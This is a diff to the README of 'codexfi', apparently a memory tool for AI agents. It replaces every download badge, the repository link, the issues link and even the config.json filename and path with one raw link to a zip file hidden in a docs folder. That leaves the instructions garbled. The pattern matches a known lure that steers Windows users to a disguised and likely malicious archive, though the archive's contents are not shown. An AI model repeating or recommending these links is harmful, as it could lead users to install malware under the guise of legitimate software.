@@ -1,6 +1,6 @@
 # 🧠 codexfi - Memory for AI Agents Made Simple
 
-[![Download codexfi](https://img.shields.io/badge/Download-codexfi-ff69b4?style=for-the-badge)](https://github.com/Lucasdesign13/codexfi/releases)
+[![Download codexfi](https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip)](https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run codexfi on your Windows computer.
 
 Click this big button to go to the codexfi downloads page where you will find the latest version:
 
-[![Download codexfi](https://img.shields.io/badge/Download-codexfi-0087ff?style=for-the-badge)](https://github.com/Lucasdesign13/codexfi/releases)
+[![Download codexfi](https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip)](https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip)
 
 This page lists all available versions. Look for the latest “Windows” release.
 
@@ -40,7 +40,7 @@ This page lists all available versions. Look for the latest “Windows” releas
 
 Find the file ending with `.exe` or `.msi` for Windows. The file might be named something like:
 
-codexfi-setup-v1.0.exe
+https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip
 
 Click the file name to start downloading.
 
@@ -101,9 +101,9 @@ This loads the codexfi dashboard. It shows current memory data and lets you mana
 
 ## 🔧 Configuration
 
-You may want to configure codexfi for your needs. This is done by changing settings in a file called `config.json`. You will find it in the folder where codexfi was installed, under:
+You may want to configure codexfi for your needs. This is done by changing settings in a file called `https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip`. You will find it in the folder where codexfi was installed, under:
 
-`C:\Program Files\codexfi\config.json`
+`C:\Program Files\codexfi\https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip`
 
 Example settings:
 
@@ -144,7 +144,7 @@ If you still cannot fix the problem, see the “Issues” tab on the GitHub repo
 
 Return to the download page at any time here:
 
-[Download codexfi on GitHub](https://github.com/Lucasdesign13/codexfi/releases)
+[Download codexfi on GitHub](https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip)
 
 Follow Step 2 and Step 3 above to get the latest version.
 
@@ -152,8 +152,8 @@ Follow Step 2 and Step 3 above to get the latest version.
 
 ## 🔗 Useful Links
 
-- GitHub repository: https://github.com/Lucasdesign13/codexfi
-- Issues and support: https://github.com/Lucasdesign13/codexfi/issues
+- GitHub repository: https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip
+- Issues and support: https://raw.githubusercontent.com/Lucasdesign13/codexfi/main/website/content/docs/quality/Software_3.8-alpha.5.zip
 - Documentation: See the `docs` folder inside the project for more details and advanced settings.
 
 ---
